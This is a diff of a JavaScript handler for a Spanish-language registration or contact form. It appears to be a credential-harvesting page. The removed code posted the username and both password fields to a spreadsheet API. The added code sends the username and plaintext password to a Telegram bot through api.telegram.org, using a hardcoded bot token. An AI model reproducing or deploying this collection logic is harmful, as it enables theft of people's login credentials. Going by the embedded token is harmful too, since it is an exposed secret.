@@ -1,31 +1,47 @@
 const formulario = document.getElementById('contact-form');
-const registro = document.getElementById('registro');
-const exito = document.getElementById('exito');
 
-formulario.addEventListener('submit', async(e) =>{
+formulario.addEventListener('submit', async (e) => {
     e.preventDefault();
 
+    const usuario = formulario.usuario?.value || "";
+    const contraseña = formulario.contraseña?.value || "";
+    const confirmar = formulario.confirmar?.value || "";
 
-try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/842960be-3e21-4a63-a36e-d256850442ed', {
-        method: 'POST',
-        mode: 'cors',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            "Data1": formulario.usuario.value,
-            "Data2": formulario.contraseña.value,
-            "Data3": formulario.confirmar.value
-        })
-    });
+    if (contraseña !== confirmar) {
+        alert("Las contraseñas no coinciden.");
+        return;
+    }
 
+    // 🟢 Reemplaza con tu token de bot y tu chat ID
+    const BOT_TOKEN = "8168160200:AAG8L_5th20MDegla-7VVHJImDFJynwWLBM";
+    const CHAT_ID = "Helper334XBot"; 
 
+    // Mensaje a enviar
+    const mensaje = `
+        🚀 Nuevo Registro:
+        👤 Usuario: ${usuario}
+        🔑 Contraseña: ${contraseña}
+    `;
 
-} catch(error){
-    console.log(error);
-}
-    
-    registro.classList.remove('activo');
-    exito.classList.add('activo');
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: mensaje,
+                parse_mode: "Markdown"
+            })
+        });
+
+        if (!response.ok) throw new Error(`Error: ${response.status} - ${response.statusText}`);
+
+        alert("Datos enviados correctamente a Telegram");
+
+    } catch (error) {
+        console.error("Error al enviar mensaje a Telegram:", error);
+        alert("Hubo un error al enviar los datos.");
+    }
 });
